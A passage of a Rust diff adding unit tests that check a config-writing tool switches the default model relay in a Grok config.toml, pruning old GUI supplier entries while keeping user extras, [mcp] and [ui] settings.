+        assert!(out.contains("default = \"New Relay\""), "{out}");
+        assert!(out.contains("[model.\"New Relay\"]"), "{out}");
+        assert!(out.contains("https://new.example.com/v1"), "{out}");
+        assert!(out.contains("[model.\"user-extra\"]"), "user extras stay: {out}");
+        assert!(out.contains("[mcp]"), "{out}");
+        assert!(out.contains("enabled = true"), "live MCP must win: {out}");
+        assert!(out.contains("[ui]"), "{out}");
+        assert!(out.contains("keep_me"), "[models] extras stay: {out}");
+        assert!(
+            !out.contains("[model.\"old-relay\"]"),
+            "previous GUI supplier must be pruned: {out}"
+        );
+        assert!(
+            !out.contains("[model.\"Earlier Relay\"]"),
+            "leftover GUI supplier from an earlier switch must be pruned: {out}"
+        );
+        let fragment = extract_routing_fragment(&out).expect("fragment");
+        assert!(!fragment.contains("[mcp]"), "{fragment}");
+        assert!(!fragment.contains("[ui]"), "{fragment}");
+        assert!(!fragment.contains("user-extra"), "{fragment}");
+    }
+
+    #[test]
+    fn write_live_only_patches_default_and_identity() {
+        let dir = std::env::temp_dir().join(format!(
+            "chatgpt-tools-grok-live-{}",
+            uuid::Uuid::new_v4()
+        ));
+        let _ = fs::remove_dir_all(&dir);
+        fs::create_dir_all(&dir).expect("temp grok home");
+        std::env::set_var("GROK_HOME", &dir);
+        fs::write(
+            dir.join("config.toml"),
+            r#"
+[models]
+default = "old-relay"
+keep_me = true
+
+[model."old-relay"]
+model = "grok-old"
+base_url = "https://old.example.com/v1"
+name = "old"
+api_key = "sk-old"
+api_backend = "responses"
+context_window = 100000
+
+[mcp]
+enabled = true
+
+[ui]
+theme = "dark"
+"#,
+        )
+        .expect("seed live");
+
+        let archive = build_custom_config_with_picker(
+            "New Relay",
+            "grok-new",
+            "https://new.example.com/v1",
+            "New Relay",
+            "grok-new",
+            "sk-new",
+            "responses",
+            256_000,
+        );
+        let provider = Provider::new("g1".into(), "New Relay".into(), json!({ "config": archive }));
+        write_live(&provider).expect("write live");
+
+        let cfg = fs::read_to_string(dir.join("config.toml")).unwrap();
+        assert!(cfg.contains("default = \"new-relay\""), "{cfg}");
+        assert!(
+            cfg.contains("[model.\"new-relay\"]") || cfg.contains("[model.new-relay]"),
+            "{cfg}"
+        );
+        assert!(cfg.contains("https://new.example.com/v1"), "{cfg}");
+        assert!(
+            !cfg.contains("[model.\"old-relay\"]"),
+            "previous GUI supplier must be pruned: {cfg}"
+        );
+        assert!(cfg.contains("[mcp]"), "{cfg}");
+        assert!(cfg.contains("enabled = true"), "{cfg}");
+        assert!(cfg.contains("[ui]"), "{cfg}");
+        assert!(cfg.contains("keep_me"), "{cfg}");
+
+        let _ = fs::remove_dir_all(&dir);
+        std::env::remove_var("GROK_HOME");
     }
 }
